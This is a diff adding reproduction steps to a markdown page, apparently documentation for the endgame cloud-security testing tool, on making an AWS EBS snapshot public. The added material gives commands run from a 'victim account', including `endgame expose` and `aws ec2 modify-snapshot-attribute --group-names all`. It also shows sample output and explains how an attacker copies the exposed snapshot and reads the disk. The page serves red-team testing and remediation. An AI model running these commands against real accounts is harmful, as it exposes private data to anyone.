@@ -2,9 +2,60 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=*
+export SNAPSHOT_ID=snap-1234567890abcdef0
+
+endgame expose --service ebs --name $SNAPSHOT_ID
+```
+
+* To expose the resource using the AWS CLI, run the following from the victim account:
+
+```bash
+export SNAPSHOT_ID=snap-1234567890abcdef0
+
+aws ec2 modify-snapshot-attribute \
+    --snapshot-id $SNAPSHOT_ID \
+    --attribute createVolumePermission \
+    --operation-type add \
+    --group-names all
+```
+
+* To view the contents of the exposed resource policy, run the following:
+
+```bash
+export SNAPSHOT_ID=snap-1234567890abcdef0
+
+aws ec2 describe-snapshot-attribute \
+    --snapshot-id $SNAPSHOT_ID \
+    --attribute createVolumePermission
+```
+
+* Observe that the contents match the example shown below.
+
 ## Example
 
+The response of `aws ec2 describe-snapshot-attribute` will match the below, indicating that the EBS snapshot is public.
+
+```json
+{
+    "SnapshotId": "snap-066877671789bd71b",
+    "CreateVolumePermissions": [
+        {
+            "Group": "all"
+        }
+    ]
+}
+```
+
 ## Exploitation
+
+After an EBS Snapshot is made public, an attacker can then:
+* [copy the public snapshot](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-snapshot.html) to their own account
+* Use the snapshot to create an EBS volume
+* Attach the EBS volume to their own EC2 instance and browse the contents of the disk, potentially revealing sensitive or otherwise non-public information.
 
 ## Remediation
 
@@ -23,3 +74,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 
 * [Sharing an Unencrypted Snapshot using the Console](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html#share-unencrypted-snapshot)
 * [Share a snapshot using the command line](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html)
+* [aws ec2 copy-snapshot](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-snapshot.html)
